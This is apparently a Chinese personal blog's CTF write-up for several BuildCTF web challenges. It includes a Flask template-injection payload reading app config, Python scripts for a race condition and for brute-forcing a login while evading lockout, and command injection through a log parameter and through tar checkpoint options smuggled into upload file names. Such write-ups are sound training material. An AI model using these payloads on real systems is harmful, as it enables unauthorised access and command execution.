<!-- build time:Tue Mar 11 2025 18:18:56 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="笔记小破站" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="笔记小破站" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="笔记小破站" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2025/01/18/CTF/BuildCTF/"><title>BuildCTF - CTF | Peppermintの小窝 = 笔记小破站 = persistence</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">BuildCTF</h1><div class="meta"><span class="item" title="创建时间：2025-01-18 22:08:51"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2025-01-18T22:08:51+08:00">2025-01-18</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>3.6k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>3 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Peppermintの小窝</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/asserts/build.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/ctf/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2025/01/18/CTF/BuildCTF/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Peppermint"><meta itemprop="description" content="persistence, "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="笔记小破站"></span><div class="body md" itemprop="articleBody"><p><strong>写在开头：</strong><br>这篇 wp 只记录了 build 里面我之前没接触过或是觉得有意思的题目，是因为搭博客从笔记上搬过来的，多多见谅</p><h4 id="redflag"><a class="anchor" href="#redflag">#</a> <strong>RedFlag</strong></h4><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-1-1.png?raw=true" alt=""><br>太丑了，整理一下<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-1-2.png?raw=true" alt=""><br>过滤了两个括号，并且将 config 和 self 列入黑名单<br>写的时候想着，既不能构造函数，又不能使用 config 和 self，所以当时卡住了<br>现在知道，其实代码能过滤的，是上下文中的 config 和 self，如果能获得全局对象中的 config 和 self 就不需要担心过滤，继而可以利用这两个辅助 [] 来构造函数<br>其中有一个 <code>get_flashed_messages</code> 函数<br>Flask 中⽤于获取闪现消息（flashed messages）的函数<br>作为⼀个函数对象， <code>get_flashed_messages</code> 拥有 <code>__globals__</code> 属性，指向其全局命名空间<br>从而构造 payload：<br><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code><br>其中 <code>current_app</code> 是 flask 的代理对象，用于引用当前 flask 应用实例，然后获取题目中设置的 FLAG 配置，从而拿到 flag<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-1-3.png?raw=true" alt=""></p><p>还有一种更加直接，直接调用 flask 中一个神奇的内置函数 <code>url_for</code> ，通过 url 的创建来访问配置：<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-1-4.png?raw=true" alt=""></p><h4 id="fake_signin"><a class="anchor" href="#fake_signin">#</a> <strong>fake_signin</strong></h4><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-2-1.png?raw=true" alt=""><br>进靶机之后正如题目所说，是个登录问题，很简单，尝试一下弱口令就进去了，账密都是 admin<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-2-2.png?raw=true" alt=""><br>发现题目后续的要求是签到满 30 天才能获得 flag，算上刚登录的签到和一次补签机会，才只有两次<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-2-3.png?raw=true" alt=""><br>审计一下题目给出的附件代码，后面基本跟着 wp 来，自己写的时候没审明白，看 wp 才知道考点是存在一个并发漏洞<br>所谓并发漏洞就是多个线程并发访问共享资源，由于没有 <code>锁机制</code> ，会导致有多个线程会同时尝试修改公共资源中的某一个值，导致最后的修改结果出现意外，也称条件竞争<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-2-4.png?raw=true" alt=""><br>这里的漏洞点就是在更新 <code>user['supplement_count']</code> 时没有锁机制，就存在了并发漏洞，通过在相近时间内访问该代码，使得 user 被不停更新，从而达成绕过 (需要注意的是，补签的条件是签到天数小于 1 的时候，也就是说不能直接签到，不然补签天数是竞争不出来的)<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-2-5.png?raw=true" alt=""><br>脚本如下：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="3"></td><td><pre>base_url <span class="token operator">=</span> <span class="token string">'http://27.25.151.80:45503/'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>USERNAME <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>PASSWORD <span class="token operator">=</span> <span class="token string">'admin'</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>supplement_dates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'2024-09-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token format-spec">02d</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token string">'username'</span><span class="token punctuation">:</span> USERNAME<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre> <span class="token string">'password'</span><span class="token punctuation">:</span> PASSWORD</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/login'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>login_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">def</span> <span class="token function">supplement_signin</span><span class="token punctuation">(</span>supplement_date<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'supplement_date'</span><span class="token punctuation">:</span> supplement_date<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'supplement_signin'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Date: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>supplement_date<span class="token punctuation">&#125;</span></span><span class="token string">, Status Code: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">,Response: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">for</span> supplement_date <span class="token keyword">in</span> supplement_dates<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>supplement_signin<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>supplement_date<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-2-6.png?raw=true" alt=""></p><h4 id="tflock"><a class="anchor" href="#tflock">#</a> <strong>tflock</strong></h4><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-1.png?raw=true" alt=""><br>经典登录框问题，先试试弱口令爆破<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-2.png?raw=true" alt=""><br>发现爆破出账号是 admin，就继续爆破密码，没有爆出来，找找看有没有什么提示。<br>在忘记密码处发现有个提示：<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-3.png?raw=true" alt=""><br>找密码本？那就目录扫描一下<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-4.png?raw=true" alt=""><br>去 <code>robots.txt</code> 看看<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-5.png?raw=true" alt=""><br>找到了密码列表，分别是 <code>ctferpass.txt</code> 和 <code>password.txt</code><br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-6.png?raw=true" alt=""><br>分别查看内容<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-7.png?raw=true" alt=""><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-8.png?raw=true" alt=""><br>给出了两个账号，分别是 ctfer 和 admin，经过测试，其中 admin 错误三次就会被锁定，但是期间如果是 ctfer 登录则会重置登录失败次数，所以可以利用给出的密码本去试错两次 admin 的密码，用 ctfer 去刷新，接着继续尝试<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-9.png?raw=true" alt=""><br>脚本如下:</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="3"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://27.25.151.80:45507/login.php'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>n <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre>ctfer <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'ctfer'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>ctfer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">for</span> password <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>admin<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    result <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'success'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> result<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>admin<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>ctfer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        n <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr></table></figure><p>成功拿到密码，拿到 flag<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-10.png?raw=true" alt=""><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-3-11.png?raw=true" alt=""></p><h4 id="我写的网站被rce了"><a class="anchor" href="#我写的网站被rce了">#</a> <strong>我写的⽹站被 rce 了？</strong></h4><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-1.png?raw=true" alt=""><br>如题所示，一个半成品的后台系统，逐个查看功能，对照抓包结果发现，除了查看日志功能外，其他功能均无传参，所以从这点入手<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-2.png?raw=true" alt=""><br>修改之后给出报错，可以看出 <code>log_type</code> 修改的就是 <code>.log</code> 的文件名，也就是说文件名可控，尝试使用管道符绕过<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-3.png?raw=true" alt=""><br>将前后都用管道符隔开，虽然路径会报错，但是 ls 命令能被执行，可以看到回显，成功拿到注入点<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-4.png?raw=true" alt=""><br>不过也是过滤了很多关键词<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-5.png?raw=true" alt=""><br>接下来就是关于 linux 命令的 rce,fuzz 出来 cat、flag、空格这些都被过滤了，利用 <code>$IFS</code> 绕过空格<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-6.png?raw=true" alt=""><br>uniq 加通配符组合成功拿到 flag<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-4-7.png?raw=true" alt=""></p><h4 id="打包给你"><a class="anchor" href="#打包给你">#</a> <strong>打包给你</strong></h4><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-1.png?raw=true" alt=""><br>文件上传类型，不过似乎多了一个下载，附件也给出了源码来审计<br>功能很明确，上传文件之后能下载下来打包好的 tar 压缩包<br>通过审计代码可以发现，上传时会对文件名检查，过滤 <code>..</code> 和 <code>/</code> ，并且文件内容长度不能大于 1000<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-2.png?raw=true" alt=""><br>需要注意的是，在下载 tar 压缩包这一步中，采用了通配符 <code>*</code> 的方式，并没有对敏感字符进行过滤，直接就将文件名塞进了 cd 这句命令里面，这样就导致了任意命令执行<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-3.png?raw=true" alt=""><br>具体实现步骤就是 &amp;&amp; 前面的 cd 先执行，跳转到对应 <code>uploads/&#123;g.uuid&#125;</code> 目录，通过 tar 工具将当前目录下的所有文件打包成一个 out.tar 压缩包<br>造成漏洞的利用点就是通过 <code>checkpoint</code> 提权<br>tar 命令可以设置 checkpoint 检查点，用于写入 n 条记录之后方便检查，在这个检查点可以执行任意的操作，从而实现提权：操作由 <code>--checkpoint-action</code> 指定，再通过 exec 来执行外部命令<br>而构造命令执行过程中需要的特殊符号也可以通过 base64 等方式进行绕过<br>首先确保传入文件内容不为空，防止 tar 打包失败<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-4.png?raw=true" alt=""><br>设置检查点<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-5.png?raw=true" alt=""><br>写入命令 <code>ls /&gt; $(pwd)/test.txt</code> 【解释一下， <code>$(pwd)</code> 是先执行 pwd 命令，将当前工作目录的路径输出】<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-11.png?raw=true" alt=""><br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-6.png?raw=true" alt=""><br>需要注意的要下载两次，第一次执行 ls / 命令，结束之后才会写入 test.txt，之后再次下载文件就能访问到 test.txt 内的内容了<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-7.png?raw=true" alt=""><br>接下来去 <code>cat /Guess_my_name</code> 来获取 flag<img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-8.png?raw=true" alt=""><br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-9.png?raw=true" alt=""><br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-5-10.png?raw=true" alt=""><br>成功拿到 flag</p><h4 id="cookie_factory"><a class="anchor" href="#cookie_factory">#</a> <strong>Cookie_Factory</strong></h4><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-6-1.png?raw=true" alt=""><br>题目要求获得 1e20 个曲奇饼干才能获得 flag，并且给出 js 源码<br>其实说白了就是一个 js 小游戏，审计一下源码<br>主体是一个实现点击增分的功能，判断得到 flag 的代码如下：<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-6-2.png?raw=true" alt=""><br>除了会进行数量判断外，还会有分数校验，如果客户端传入的 json.value 与服务器记录的值不一样就会返回错误信息<br>oldvalue 是当前分数，newvalue 会更新为 <code>session[socket.id]</code> 内的值，并且发送给客户端，json.power 为点击权限，当其大于 10 时会返回错误信息<br>由于上述代码，导致在 js 控制台更新值的时候基本无法改变 json.value，但是可以改变 power 的值来影响 value 的生成，虽然也会有报错信息，但是直接利用控制台丢掉就行<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/ctf/build-6-3.png?raw=true" alt=""></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2025-01-19 19:37:16" itemprop="dateModified" datetime="2025-01-19T19:37:16+08:00">2025-01-19</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Peppermint <i class="ic i-at"><em>@</em></i>笔记小破站</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2025/01/18/CTF/BuildCTF/" title="BuildCTF">http://example.com/2025/01/18/CTF/BuildCTF/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2025/01/15/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/" itemprop="url" rel="prev" data-background-image="&#x2F;asserts&#x2F;geek.png" title="极客大挑战2024"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> CTF</span><h3>极客大挑战2024</h3></a></div><div class="item right"><a href="/2025/01/21/CTF/BaseCTF/" itemprop="url" rel="next" data-background-image="&#x2F;asserts&#x2F;base.jpg" title="BaseCTF"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> CTF</span><h3>BaseCTF</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#redflag"><span class="toc-number">1.</span> <span class="toc-text">RedFlag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fake_signin"><span class="toc-number">2.</span> <span class="toc-text">fake_signin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tflock"><span class="toc-number">3.</span> <span class="toc-text">tflock</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E5%86%99%E7%9A%84%E7%BD%91%E7%AB%99%E8%A2%ABrce%E4%BA%86"><span class="toc-number">4.</span> <span class="toc-text">我写的⽹站被 rce 了？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E7%BB%99%E4%BD%A0"><span class="toc-number">5.</span> <span class="toc-text">打包给你</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie_factory"><span class="toc-number">6.</span> <span class="toc-text">Cookie_Factory</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2025/01/15/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/" rel="bookmark" title="极客大挑战2024">极客大挑战2024</a></li><li class="active"><a href="/2025/01/18/CTF/BuildCTF/" rel="bookmark" title="BuildCTF">BuildCTF</a></li><li><a href="/2025/01/21/CTF/BaseCTF/" rel="bookmark" title="BaseCTF">BaseCTF</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Peppermint" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Peppermint</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">14</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">6</span> <span class="name">分类</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2025/01/15/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2025/01/21/CTF/BaseCTF/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/vulnhub/" title="分类于 vulnhub">vulnhub</a></div><span><a href="/2025/01/22/penetration/vulnhub/w1r3s%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="w1r3s靶机渗透">w1r3s靶机渗透</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2025/01/13/hello-world/" title="Hello World">Hello World</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/03/11/penetration/hackthebox/Dog/" title="Dog">Dog</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/02/04/penetration/hackthebox/Chemistry/" title="Chemistry">Chemistry</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a></div><span><a href="/2025/01/18/CTF/BuildCTF/" title="BuildCTF">BuildCTF</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/02/12/penetration/hackthebox/Cicada/" title="Cicada">Cicada</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/01/28/penetration/hackthebox/HTB%E9%99%8D%E4%BD%8E%E5%BB%B6%E8%BF%9F/" title="HTB降低延迟">HTB降低延迟</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 ctfshow">ctfshow</a> 